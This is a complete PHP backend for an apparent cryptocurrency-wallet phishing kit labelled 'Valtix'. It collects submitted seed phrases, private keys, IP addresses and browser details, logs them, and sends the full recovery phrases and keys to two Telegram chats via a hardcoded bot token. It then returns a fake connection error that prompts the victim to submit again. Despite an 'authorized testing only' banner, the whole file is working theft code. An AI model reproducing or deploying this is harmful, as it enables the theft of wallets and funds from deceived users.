<?php
/**
 * collect.php — Valtix Capture Backend
 * Sends to TWO Telegram recipients with complete seed phrases.
 * ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
 */

$TELEGRAM_BOT_TOKEN = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
$TELEGRAM_CHAT_IDS  = [
    getenv('TELEGRAM_CHAT_ID') ?: '6964954278',
    '8955126022'
];
$ENCRYPTION_KEY     = 'Valtix_Render_2026_SecretKey!!';  // 32 chars
$ENCRYPTION_IV      = '1234567890abcdef';                // 16 chars

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die(json_encode(['error' => 'Method not allowed']));
}

$seed       = $_POST['seed'] ?? '';
$pkey       = $_POST['pkey'] ?? '';
$userAgent  = $_POST['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$pageUrl    = $_POST['pageUrl'] ?? 'unknown';
$screenSize = $_POST['screenSize'] ?? 'unknown';
$ip         = $_SERVER['REMOTE_ADDR'] ?? ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'unknown');
$timestamp  = date('Y-m-d H:i:s');

// Ensure logs directory
$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}

// Build record
$record = [
    'id'            => uniqid('vt_', true),
    'ip'            => $ip,
    'userAgent'     => $userAgent,
    'pageUrl'       => $pageUrl,
    'screenSize'    => $screenSize,
    'seed'          => $seed ?: null,
    'pkey'          => $pkey ?: null,
    'seedWordCount' => $seed ? str_word_count($seed) : 0,
    'capturedAt'    => $timestamp
];

// Save encrypted to file
$plaintext  = json_encode($record);
$encrypted  = openssl_encrypt($plaintext, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV);
file_put_contents($logDir . '/captures.log', base64_encode($encrypted) . "\n", FILE_APPEND);

// Save human-readable summary
$summary = "$timestamp | {$record['id']} | IP: $ip | Seed: {$record['seedWordCount']} words | Key: " . ($pkey ? 'YES' : 'NO') . "\n";
file_put_contents($logDir . '/summary.log', $summary, FILE_APPEND);

// --- SEND TELEGRAM ALERTS TO BOTH RECIPIENTS ---
function sendTelegramAlert($botToken, $chatId, $record) {
    $hasSeed = !empty($record['seed']);
    $hasKey  = !empty($record['pkey']);
    
    $message = "🚨 **Valtix — New Capture** 🚨\n\n";
    $message .= "📅 Time: {$record['capturedAt']}\n";
    $message .= "🌐 IP: `{$record['ip']}`\n";
    $message .= "📝 Seed: " . ($hasSeed ? '✅ ' . $record['seedWordCount'] . ' words' : '❌ None') . "\n";
    $message .= "🔑 Private Key: " . ($hasKey ? '✅ Captured' : '❌ None') . "\n";
    
    // Send FULL seed phrase — no truncation
    if ($hasSeed) {
        $message .= "\n📄 **Full Recovery Phrase:**\n`{$record['seed']}`\n";
    }
    if ($hasKey) {
        $message .= "\n🔐 **Full Private Key:**\n`{$record['pkey']}`\n";
    }
    
    $message .= "\n📱 " . mb_substr($record['userAgent'], 0, 60);
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => "https://api.telegram.org/bot$botToken/sendMessage",
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode([
            'chat_id'    => $chatId,
            'text'       => $message,
            'parse_mode' => 'Markdown'
        ]),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
    ]);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}

// Send to both recipients
foreach ($TELEGRAM_CHAT_IDS as $chatId) {
    $chatId = trim($chatId);
    if (!empty($chatId)) {
        sendTelegramAlert($TELEGRAM_BOT_TOKEN, $chatId, $record);
    }
}

// Always return failure to the victim
echo json_encode([
    'success' => false,
    'error'   => 'Connection failed. Please verify your recovery phrase and try again.'
]);
